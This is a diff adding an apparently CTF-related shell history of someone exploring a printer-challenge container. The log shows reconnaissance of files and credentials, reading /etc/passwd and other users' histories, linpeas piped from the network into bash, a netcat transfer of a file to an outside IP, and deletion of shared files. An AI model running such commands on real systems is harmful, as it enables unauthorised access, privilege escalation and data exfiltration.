@@ -1,0 +1,766 @@
+ls -la
+cat /var/spool/printer.log
+ps aux
+uname -a
+cd /tmp
+ls -la
+touch amon_was_here
+ls -la
+cd /dev/shm
+sudo -l
+ls -la
+touch amon_was_here
+exit
+ls
+ps ax
+ps aux
+cd ib
+ls
+cd lib
+ls
+cd public
+ls
+cd incoming
+ls
+ls -la
+cd ..
+ls -lah
+cd incoming
+echo "test" > test.txt
+ls
+ls -la
+rm test.txt
+ls
+cd ..
+ls
+ls -lah
+ls -la
+ls -las
+ps aux
+kill 1590
+ps aux
+kill 1597
+ps ax
+cd /var/spool/printer.log /app/lib/public/incoming/dp.log
+cp /var/spool/printer.log /app/lib/public/incoming/dp.log
+ls
+cd /app/lib/public/incoming
+ls
+rm dp.log
+ls
+exit
+whoami
+ls
+cd /var/spool
+ls
+cat printer.log
+w
+ls
+cat ./ls
+cd ./ls
+ls
+cd lib
+ls
+cat ./app.rb 
+cat /tmp/uptime-check.txt
+cd /tmp
+ls
+cat ./amon_was_here 
+cat ./20211218-1-z8u46a-out
+cat ./t.c
+cat ./t
+ls
+t
+./t
+cd app
+cd /app
+ls
+cd lib
+ls
+cd public
+ls
+cd incoming
+ls
+cat ./printer.log 
+ls
+cat ./8675309.txt
+cat ./printer.log
+ls
+cat ./ls
+cd ..
+ls
+cd ./css
+ls
+cd ..
+ls
+cd ./images/
+ls
+cd ../..
+ls
+cd views
+ls
+cat ./login.erb 
+ls
+cat ./config.erb
+ls
+cat ./PrinterStatus.erb 
+ls
+cat ./error.erb 
+ls
+cat ./reports_and_information.erb 
+ls
+cat ./topbar.erb 
+ls
+cd ..
+ls
+cd ./app.rb 
+cat ./app.rb
+ls
+cd ..
+ls
+cd ..
+ls
+cd var
+ls
+cd spool
+ls
+cat ./mail
+cd ./mail
+ls
+cd ..
+ls
+cat ./printer.log
+ls
+cd ..
+ls
+cd ./backups
+ls
+cd ../cache
+ls
+cd ..
+ls
+cat ./firmware.zip
+ls
+unzip ./firmware.zip
+whoami
+ls
+cd lib
+ls
+cd ..
+cd local
+ls
+cd ..
+ls
+cd ./mail
+ls
+cd ..
+cd ./opt
+ls
+cd ..
+cd ./run
+sl
+ls
+cat ./utmp
+last -f ./utmp
+ls
+cat ./lock
+cd ./lock
+ls
+cd ../..
+ls
+cd ./tmp
+ls
+cd ..
+ls
+cd tmp
+ls
+cat ./RackMultipart20211218-1-10v4ykr.json
+ls
+cd ..
+ls
+cd /var/log
+ls
+last -f ./wtmp
+ls
+cat ./lastlog
+ls -Fal
+cat printer.gemspec
+echo $SHELL
+cd ..
+ll
+ls -Fal
+cat .dockerenv
+ls -Fal pro/
+ls -Fal proc/
+free -m
+cat /proc/cpuinfo
+docker ps
+ls -Fal
+ls -Fal usr/bin/
+ps auxw
+exit
+ls
+cd spool
+ls
+base64 birdknob.png
+ls
+cat printer.log
+ls
+cd ~
+ls
+ls -la
+cat .bashrc
+ls
+ls -la
+cd ..
+ls -la
+cd ..
+ls
+cd tmp
+ls
+cat uptime-check.tx
+cat uptime-check.txt
+cd ..
+ls
+cd app
+ls
+cat config.ru
+ls
+cat printer.gemspec
+ls
+cat Gemfile
+cd lib
+ls
+cat app.rb
+ls
+cd public
+ls
+ls -la
+cd incoming
+ls
+ls -la
+cd ..
+ls -la
+cd incoming
+ls -la
+ls
+ls -la
+cd ..
+ls -la
+cd ..
+ls
+cd views
+ls
+cat login.erb
+ls
+cd ..
+ls
+cd ..
+ls
+cd ..
+ls
+cd var
+cd spool
+ls
+mv birdknob.png /app/lib/public/incoming
+cp birdknob.png /app/lib/public/incoming
+ls
+whoami
+/bin/bash
+grep '.xlsx' /var/spool/printer.log
+exit
+ls
+cd lib/
+ls
+cat a
+cat app.rb 
+upt
+uptime 
+cat /tmp/
+ls /tmp/
+cat /tmp/uptime-check.txt 
+cd tmp
+cd /tmp
+cd 20211219-1-zy3noi-out/
+ls
+cat ls
+ls -la
+cd ..
+ls
+cd 20211219-1-zmxy1c-out
+ls
+cd ..
+ls
+less t.c
+cat t.c
+cat //app/lib/public/incoming/8675309.txt
+ps aux
+ps ax
+exit
+ls
+ls -la
+cat printer.gemspec 
+ls
+ps ax
+ps ax | grep 8888
+exit
+cd
+ls -al
+cd /var/spool
+ls
+tail printer.log
+cat printer.log
+exit
+ls -la
+cat /var/spool/printer.log
+ls -la
+whoami
+groups
+id
+reset
+stty rows 32 columns 157
+export SHELL=/bin/bash
+echo $TERM
+export TERM=xterm
+clear
+ls -la
+ls  -la /var/spool/printer.log
+cat /var/spool/printer.log | grep xlsx
+exit
+cat /var/spool/printer.log
+ls -la
+cd ..
+ls
+cd app
+cd lib
+ls -la
+less app.rb
+cat app.rb
+ls
+cd views
+ls
+cat login.erb
+ls
+ls -la /var/www/
+ls -la /var
+netstat -tunalp
+ss -tunalp
+ls -la
+ip a
+cd /
+ls -la
+ls -la /home/
+ls -la /home/app
+cat /home/app/.bash_history
+pwd
+ls -la
+cd /var
+ls -la
+cd spool
+ls -la
+cat printer.log
+exit
+cd /
+ls
+cd /home
+ls
+cd app
+ls
+ls -la
+cat /etc/passwd
+sudo -;
+sudo -l
+exit
+ls
+ls /var/spool/
+cat /var/spool/printer.log
+pstree
+ls /proc
+exit
+ls
+pwd
+ls -lath
+whoami
+ls /
+uname -a
+ls
+cat config.ru
+ls
+ls /var/spool/
+ls /var/spool/printer.log
+cat /var/spool/printer.log
+netstat -lapute
+ip addr
+/bin/bash
+exit
+reset
+ls -la /
+ls -la /var
+ls -la /home/
+ls -la /home/app/
+ls -la /root/
+ls -la
+cd lib/
+ls -la
+vim app.rb 
+cat app.rb 
+cat /tmp/uptime-check.txt
+ls -la /tmp/
+ls /tmp
+ls /tmp | more
+ls -la 1f3pg9dn
+cat 1f3pg9dn
+ls -la
+cat /tmp/1f3pg9dn
+ls -la /tmp
+ls -la /tmp/t.c
+cat /tmp/t.c
+cd /app/lib/public/
+ls -la
+cd incoming/
+ls -la
+mail
+cat mail 
+c d..
+cd ..
+ls -la
+ls images/
+ls css
+ls
+cd ..
+ls -la
+cd views/
+ls -la
+cat config.erb
+cat login.erb 
+ls -la
+exit
+ls
+cat printer.gemspec
+ls /
+ls /opt
+ls /home
+find .
+cat config.ru
+cat ./lib/public/incoming/wololo
+ls
+ls lib
+ls lib/app.rb
+cat /lib/app/rb
+cat /lib/app.rb
+ls
+find /opt
+pwd
+find .
+cat /var/spool/printer.log
+cd /tmp
+cd k
+ls -al
+wget http://54.176.196.151/linpeas.sh
+ls -al
+chmod +x linpeas.sh
+cat /var/spool/printer.log
+./linpeas.sh > linp.txt
+cd /tmp
+cd k
+ls -al
+cp linp.txt /app/lib/public/incoming/
+sudo -l
+cd ..
+rm -rf k
+cd /app
+cd lib
+cd public
+dir
+cd incoming
+ls -al
+cd ..
+rm incoming -rf
+cd ..
+cd public
+ls
+ls -l
+cd incoming
+ls -al
+exit
+cd /var/log
+ls
+cd /var/spool
+ls
+more printer.log
+ls
+cd mail
+ls
+cd ..
+ls
+whoami
+ss -ant
+ls
+cp birdknob.png /app/lib/public/incoming
+cd /home
+ls
+cd app
+ls
+ls -la
+more .bash_history
+exit
+ls
+id
+cd /var/log
+ls -l
+cd /var/spool
+ls -l
+cat printer.log 
+exit
+whoami
+cd /va/log
+ls
+cd ..
+ls
+cd var
+ls
+cd log
+ls
+cd ..
+cd sppol
+cd spool
+ls
+cat printer.log
+exit
+whoami
+ls
+cat /var/spool/printer.log
+whoami
+ls
+ll
+ls -l
+cd lib
+ls
+less app.rb
+cat app.rb
+ls -l
+cd public
+ls -l
+cd incoming
+ls -la
+cd apt
+ls -la
+cd ..
+cat /var/spool/printer.log
+ls /
+ls /app
+cd ..
+cat config.ru
+history
+ls -l
+cat printer.gemspec
+ls -l
+cd lib
+ls -l
+ls views
+ls -l views
+cat views/login.erb
+ps -aux
+ps 
+netstat
+ifconfig
+ls -l
+net
+?
+ls /etc/
+cat /etc/motd
+ls /etc/networks
+cat /etc/networks
+ls /
+ls /opt
+ls /home
+ls /home/app
+ls -l /home/app
+ls -la /home/app
+ls -la /var/log
+ls -la /var/
+ls -la /var/log/mail
+cat /var/log/mail
+ls -la /var/mail
+ls -la /var/log
+ls /
+ls -la /opt/
+ls -la /dev
+ls /
+ls -la /root
+ls -la /srv
+ls -la /tmp
+ls -la /usr
+ls -la /var
+ls -la /var/lib
+ls -la /var/log
+ls -la /var/opt
+ls -la
+ls /app
+cat /app/Gemfile
+exit
+cd ../spool
+ls -Al
+cat printer.log
+ls -Al
+clear
+export TERM=xterm
+clear
+ls -AL
+cd ..
+ls -Al
+cd spool
+cat birdknob.png | base64
+cp birdknob.png /app/lib/public/incoming/marlas-bird.png
+ls -Al
+cat mail
+cd mail
+ls -Al
+cd ../
+cd /
+ls -Al
+cd ~
+ls -Al
+netstat -antp | grep 22
+which nc
+nc 127.0.0.1 22
+cd .config
+ls -Al
+cd /app
+ls -AL
+ls -Al
+cat config.ru 
+env
+ls -Al
+cat /var/spool/printer.log
+exit
+nc -h
+ls
+cd /var/spool
+ls
+nc -w3 3.86.187.175 42428 < birdknob.png
+ls
+md5sum birdknob.png
+exit
+ls
+export TERM=xterm
+ls
+cat config.ru 
+ls
+cat config.ru 
+cd lib
+ls
+cat app.rb 
+cd /tmp
+ls
+strings ./printer-chall.tar.bz2 
+ls -atlr
+cat RackMultipart20220101-1-xbceo4.json 
+ls a-tlr
+cd /opt
+ls
+cd /var/spool
+ls
+base64 -w0 ./birdknob.png 
+ls -atlr
+cat prr
+cat printer.log 
+sudo -l
+w
+who
+ls -atlr
+cd
+ls -atlr
+cd /home
+ls
+cd app
+ls
+ls -atlr
+cat .bash_history
+curl -L https://github.com/carlospolop/PEASS-ng/releases/download/$LATEST_VERSION/linpeas.sh | sh
+curl -L https://github.com/carlospolop/PEASS-ng/releases/download/$LATEST_VERSION/linpeas.sh | bash
+curl -s https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F253%2Fmerge/linpeas.sh | bash
+curl -s https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/bc6d3b1c-520c-4377-a509-4e644fc1be3f?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220101%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20220101T215616Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=4fb572724a52903e79dcde2787c0b0a89ef21f2921535567a18ca2834f914683&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=165548191&amp;response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&amp;response-content-type=application%2Foctet-stream | bash
+curl -s 'https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/bc6d3b1c-520c-4377-a509-4e644fc1be3f?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220101%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20220101T215616Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=4fb572724a52903e79dcde2787c0b0a89ef21f2921535567a18ca2834f914683&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=165548191&amp;response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&amp;response-content-type=application%2Foctet-stream' | bash
+wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F253%2Fmerge/linpeas.sh
+ls
+bash linpeas.sh 
+ls
+mkdir ...
+mv linpeas.sh ...
+cd ...
+bash linpeas.sh 
+ls
+export TERM=xterm
+ls
+cat config.ru
+cd lib
+ls
+cat app.rb
+cd /var/spool
+ls
+cd mail
+ls
+cat mail
+ls -atlr
+cd ..
+ls
+cat printer.log 
+pwd
+tail /var/spool/printer.log
+cat /var/spool/printer.log
+hostname
+cat /etc/os-release
+uname -a
+which bash
+which sh
+ls -l /bin/sh
+exit
+reset
+ls
+cd lib/
+ls
+cat app.rb 
+ls
+cd public/
+ls
+cd incoming/
+ls
+cat slo.txt 
+rm printer.log 
+ls
+ls apt/
+ls
+rmdir apt
+ls
+rm 0xdf 
+y
+ls
+rm *
+ls
+cd ~
+ls
+ls -la
+sudo -l
+cat .wget-hsts 
+cat .bash_history 
+ls
+cat /etc/os-release 
+id
+pwd
+ls
+script /dev/null -c bash
+export TERM=xterm
+clear
+ls -Al
+exit
+hostname
+id
+cd /var/spool
+ls -Al
+tail printer.log -n 1
+exit
+ls
+ls -la
+ps -ef
+exit
